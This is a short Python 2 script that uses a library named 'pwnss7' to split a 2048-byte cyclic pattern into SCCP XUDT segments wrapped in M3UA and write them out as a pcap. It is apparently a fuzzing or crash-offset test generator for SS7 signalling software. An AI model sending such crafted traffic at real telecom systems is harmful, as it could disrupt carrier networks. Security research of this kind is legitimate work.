#!/usr/bin/env python2

import subprocess
import sys
from cStringIO import StringIO
from binascii import unhexlify
from itertools import islice
import string


# add pwnss7 directory to be able to import pwnss7 submodules
import sys
from os import path
sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))


from pwnss7.m3ua import encode_data
from pwnss7.sccp import fragment
from pwnss7.ber import encode_ber, decode_ber, Asn1Obj, encode_integer
from pwnss7.util import cyclic, convert2pcap

msg = cyclic(2048)
xudt_size = 200

CALLED_GT = unhexlify('12930011047228190600')
CALLING_GT = unhexlify('1206001104722819604106')

pkts = []
for xudt in fragment(msg, CALLED_GT, CALLING_GT, xudt_size):
  pkts.append(encode_data(xudt, 666, 1337, 0))

pcap = convert2pcap(pkts)
sys.stdout.write(pcap)
